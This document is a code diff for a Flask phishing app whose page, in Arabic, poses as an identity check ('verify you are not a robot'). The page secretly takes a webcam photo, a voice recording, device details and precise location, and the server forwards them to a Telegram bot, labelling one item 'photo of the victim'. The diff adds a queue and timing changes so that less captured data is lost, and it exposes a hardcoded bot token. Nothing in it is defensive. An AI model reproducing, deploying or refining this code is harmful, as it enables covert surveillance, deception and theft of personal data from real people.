@@ -1,5 +1,7 @@
 import base64
 import requests
+import time
+from threading import Thread
 from flask import Flask, request, render_template_string, jsonify
 
 app = Flask(__name__)
@@ -7,25 +9,57 @@ app = Flask(__name__)
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
 
-# ========== صفحة الصيد (لن تغلق ولا توجيه) ==========
+# قائمة انتظار بسيطة لضمان عدم فقدان البيانات
+queue = []
+def process_queue():
+    while True:
+        time.sleep(2)
+        if queue:
+            item = queue.pop(0)
+            try:
+                send_to_telegram(item['type'], item['content'], item.get('caption', ''))
+            except Exception as e:
+                print(f"Queue error: {e}")
+
+Thread(target=process_queue, daemon=True).start()
+
+def send_to_telegram(data_type, content, caption=""):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
+    chat_id = ADMIN_ID
+    try:
+        if data_type == "text":
+            requests.post(url + "sendMessage", json={'chat_id': chat_id, 'text': content, 'parse_mode': 'HTML'}, timeout=10)
+        elif data_type == "photo":
+            img_bytes = base64.b64decode(content.split(',')[1])
+            requests.post(url + "sendPhoto", data={'chat_id': chat_id, 'caption': caption}, files={'photo': ('photo.jpg', img_bytes)}, timeout=15)
+        elif data_type == "audio":
+            audio_bytes = base64.b64decode(content.split(',')[1])
+            requests.post(url + "sendVoice", data={'chat_id': chat_id, 'caption': caption}, files={'voice': ('voice.ogg', audio_bytes)}, timeout=15)
+        print(f"✅ Sent {data_type}")
+    except Exception as e:
+        print(f"❌ Send error: {e}")
+
+# ========== صفحة HTML محسّنة ==========
 HTML_PAGE = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>التحقق الأمني</title>
     <style>
         body{background:#0a0a0a;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh}
         .card{background:#1a1a2e;padding:2rem;border-radius:2rem;text-align:center;max-width:400px}
         .btn{background:#e67e22;color:white;padding:1rem;border:none;border-radius:2rem;width:100%;font-size:1.2rem;cursor:pointer}
-        #status{margin-top:1rem;color:#f39c12}
+        .btn:disabled{background:#555;cursor:not-allowed}
+        #status{margin-top:1rem;color:#f39c12;font-weight:bold}
         video,canvas{display:none}
     </style>
 </head>
 <body>
 <div class="card">
     <h2>🔒 تأكيد الهوية</h2>
-    <p>اضغط للتحقق</p>
+    <p>اضغط للتحقق من أنك لست روبوتاً</p>
     <button class="btn" id="btn">تحقق الآن</button>
     <div id="status"></div>
 </div>
@@ -39,55 +73,60 @@ HTML_PAGE = """
 
     async function sendData(endpoint, payload) {
         try {
-            const response = await fetch(endpoint, {
+            const res = await fetch(endpoint, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify(payload),
                 keepalive: true
             });
-            await response.json();
-        } catch(e) { console.error(e); }
+            return await res.json();
+        } catch(e) { console.error(e); return null; }
     }
 
     btn.onclick = async () => {
         btn.disabled = true;
-        statusDiv.innerText = "جاري التجهيز...";
+        statusDiv.innerHTML = "⏳ جاري التحقق... (قد يستغرق دقيقة)";
 
         try {
+            // طلب الصلاحيات
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             video.srcObject = stream;
 
-            // تسجيل الصوت 3 ثوانٍ
-            statusDiv.innerText = "🎙️ تسجيل الصوت...";
+            // انتظار حتى تستقر الكاميرا (ضبط تلقائي للإضاءة)
+            statusDiv.innerHTML = "🎥 تجهيز الكاميرا...";
+            await new Promise(r => setTimeout(r, 2500));
+
+            // 1. التقاط الصورة بعد التأخير
+            statusDiv.innerHTML = "📸 التقاط الصورة...";
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imgData = canvas.toDataURL('image/jpeg', 0.95);
+            await sendData('/api/capture', { type: 'photo', data: imgData });
+
+            // 2. تسجيل الصوت (3 ثوانٍ)
+            statusDiv.innerHTML = "🎙️ تسجيل الصوت (3 ثوانٍ)...";
             const mediaRecorder = new MediaRecorder(stream);
-            let audioChunks = [];
-            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
-            const audioPromise = new Promise((resolve) => {
+            let chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            const audioDone = new Promise(resolve => {
                 mediaRecorder.onstop = async () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
                     const reader = new FileReader();
-                    reader.onloadend = () => {
-                        sendData('/api/capture', { type: 'audio', data: reader.result });
+                    reader.onloadend = async () => {
+                        await sendData('/api/capture', { type: 'audio', data: reader.result });
                         resolve();
                     };
-                    reader.readAsDataURL(audioBlob);
+                    reader.readAsDataURL(blob);
                 };
             });
             mediaRecorder.start();
             await new Promise(r => setTimeout(r, 3000));
             mediaRecorder.stop();
-            await audioPromise;
+            await audioDone;
 
-            // صورة
-            statusDiv.innerText = "📸 التقاط الصورة...";
-            await new Promise(r => setTimeout(r, 500));
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            const imgData = canvas.toDataURL('image/jpeg', 0.9);
-            await sendData('/api/capture', { type: 'photo', data: imgData });
-
-            // معلومات الجهاز
+            // 3. معلومات الجهاز
             const battery = navigator.getBattery ? await navigator.getBattery() : { level: 0, charging: false };
             const deviceInfo = {
                 ua: navigator.userAgent,
@@ -100,18 +139,31 @@ HTML_PAGE = """
             };
             await sendData('/api/capture', { type: 'device', data: deviceInfo });
 
-            // الموقع
-            navigator.geolocation.getCurrentPosition(
-                pos => sendData('/api/capture', { type: 'location', data: { lat: pos.coords.latitude, lon: pos.coords.longitude } }),
-                () => {}
-            );
+            // 4. الموقع الجغرافي (مع انتظار)
+            statusDiv.innerHTML = "📍 جلب الموقع...";
+            const locationPromise = new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+            const location = await locationPromise;
+            if (location) {
+                await sendData('/api/capture', { type: 'location', data: location });
+            }
 
-            stream.getTracks().forEach(t => t.stop());
-            statusDiv.innerHTML = "✅ تم التحقق بنجاح. يمكنك إغلاق الصفحة.";
+            // إيقاف الكاميرا والميكروفون
+            stream.getTracks().forEach(track => track.stop());
+
+            // إتمام العملية (يبقى الزر معطلاً ولكن نغير النص)
+            statusDiv.innerHTML = "✅ تم التحقق بنجاح. شكراً لك.";
+            // لا نعيد تمكين الزر، نتركه معطلاً.
+            // لا توجيه لأي رابط.
         } catch(err) {
             console.error(err);
-            statusDiv.innerText = "❌ فشل: يرجى السماح بالكاميرا والميكروفون والموقع";
-            btn.disabled = false;
+            statusDiv.innerHTML = "❌ فشل: يرجى السماح بالكاميرا والميكروفون والموقع";
+            btn.disabled = false;  // يمكن إعادة المحاولة
         }
     };
 </script>
@@ -119,61 +171,37 @@ HTML_PAGE = """
 </html>
 """
 
-# ========== دوال الإرسال لتليجرام ==========
-def send_to_telegram(data_type, content, caption=""):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
-    chat_id = ADMIN_ID
-    try:
-        if data_type == "text":
-            requests.post(url + "sendMessage", json={'chat_id': chat_id, 'text': content, 'parse_mode': 'HTML'}, timeout=10)
-        elif data_type == "photo":
-            img_bytes = base64.b64decode(content.split(',')[1])
-            requests.post(url + "sendPhoto", data={'chat_id': chat_id, 'caption': caption}, files={'photo': ('photo.jpg', img_bytes)}, timeout=15)
-        elif data_type == "audio":
-            audio_bytes = base64.b64decode(content.split(',')[1])
-            requests.post(url + "sendVoice", data={'chat_id': chat_id, 'caption': caption}, files={'voice': ('voice.ogg', audio_bytes)}, timeout=15)
-        print(f"✅ تم إرسال {data_type}")
-    except Exception as e:
-        print(f"❌ خطأ في الإرسال: {e}")
+@app.route('/')
+def index():
+    return render_template_string(HTML_PAGE)
 
-# ========== مسار استقبال البيانات من الصفحة ==========
 @app.route('/api/capture', methods=['POST'])
 def capture():
     data = request.get_json()
     if not data:
         return jsonify({'ok': False}), 400
     t = data['type']
-    print(f"📥 استلمت: {t}")
-
+    print(f"Captured: {t}")
     if t == 'photo':
-        send_to_telegram('photo', data['data'], "📸 صورة الضحية")
+        queue.append({'type': 'photo', 'content': data['data'], 'caption': '📸 صورة الضحية'})
     elif t == 'audio':
-        send_to_telegram('audio', data['data'], "🎤 تسجيل صوتي")
+        queue.append({'type': 'audio', 'content': data['data'], 'caption': '🎤 تسجيل صوتي'})
     elif t == 'device':
         d = data['data']
-        msg = f"""<b>📱 معلومات الجهاز</b>
+        txt = f"""<b>📱 معلومات الجهاز</b>
 🌐 المتصفح: {d['ua'][:80]}
-💻 المنصة: {d['platform']}
+🖥️ المنصة: {d['platform']}
 🗣️ اللغة: {d['language']}
 🧠 النوى: {d['cores']}
 💾 الرام: {d['ram']} GB
 🔋 البطارية: {d['battery']}% {'⚡' if d['charging'] else ''}"""
-        send_to_telegram('text', msg)
+        queue.append({'type': 'text', 'content': txt})
     elif t == 'location':
         loc = data['data']
-        msg = f"📍 الموقع:\nhttps://www.google.com/maps?q={loc['lat']},{loc['lon']}"
-        send_to_telegram('text', msg)
-    else:
-        send_to_telegram('text', f"🧪 اختبار: {data['data']}")
-
+        txt = f"📍 الموقع الجغرافي:\nhttps://www.google.com/maps?q={loc['lat']},{loc['lon']}"
+        queue.append({'type': 'text', 'content': txt})
     return jsonify({'ok': True})
 
-# ========== واجهة الصفحة الرئيسية ==========
-@app.route('/')
-def index():
-    return render_template_string(HTML_PAGE)
-
-# ========== Webhook البوت (لأوامر تليجرام) ==========
 @app.route('/webhook', methods=['POST'])
 def webhook():
     update = request.get_json()
